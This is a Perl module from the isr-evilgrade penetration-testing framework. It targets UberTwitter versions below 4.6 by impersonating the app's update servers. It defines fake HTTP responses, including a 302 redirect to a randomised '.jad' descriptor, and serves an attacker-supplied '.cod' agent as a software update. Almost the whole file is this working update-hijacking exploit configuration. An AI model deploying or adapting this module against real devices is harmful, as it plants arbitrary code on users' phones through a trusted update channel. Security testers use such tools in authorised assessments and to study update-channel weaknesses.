###############
# ubertwitter.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::ubertwitter;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'UberTwitter',
    'version'     => '1.0',
    'appver'      => '< 4.6 (0.971)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(reg3.ubertwitter.com|reg2.ubertwitter.com)',
    'request'     => [
        {   'req'    => '/do_reg.php',    #regex friendly
            'type'   => 'file',           #file|string|agent|install
            'method' => '',               #any
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,
            'file' => './include/ubertwitter/update',
        },
        {   'req'     => '/download.php',           #regex anything
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://reg2.ubertwitter.com/update<%RND1%>.jad \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },

        {   'req'    => '.jad',                     #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' => '',
            'parse'  => 0,
            'file'    => './agent/EkopartyWebIcon.jad',
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-type: text/vnd.sun.j2me.app-descriptor \r\n"
                . "Connection: close \r\n\r\n"

        },

        {   'req'    => '.cod',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/EkopartyWebIcon.cod',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 0,
            'desc' => 'Status'
        },
        'version' => {
            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
